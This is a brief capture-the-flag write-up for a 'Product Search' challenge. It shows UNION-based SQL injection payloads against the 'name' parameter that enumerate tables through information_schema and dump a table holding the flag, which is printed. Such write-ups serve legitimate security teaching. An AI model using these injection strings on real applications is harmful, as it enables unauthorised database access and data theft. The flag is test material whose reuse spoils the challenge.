# Writeup
"Product Search", you can search "everything". The `name` parameter is a classic UNION-based SQL injection.

First find the number of columns and dump the table list from `information_schema`:

```
/sqli/step3.php?name=' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

The result shows the tables:

```
flagisdead
items
```

`flagisdead` looks promising, so dump it:

```
/sqli/step3.php?name=' UNION SELECT *,NULL FROM flagisdead-- -
```

The flag shows up in the Name column:

```
katagaitai-CTF{information_schema_is_only_for_MySQL}
```

As the flag says, `information_schema` is a MySQL thing (SQLite doesn't have it), so the intended lesson is "know your DBMS".

# flag
```
katagaitai-CTF{information_schema_is_only_for_MySQL}
```
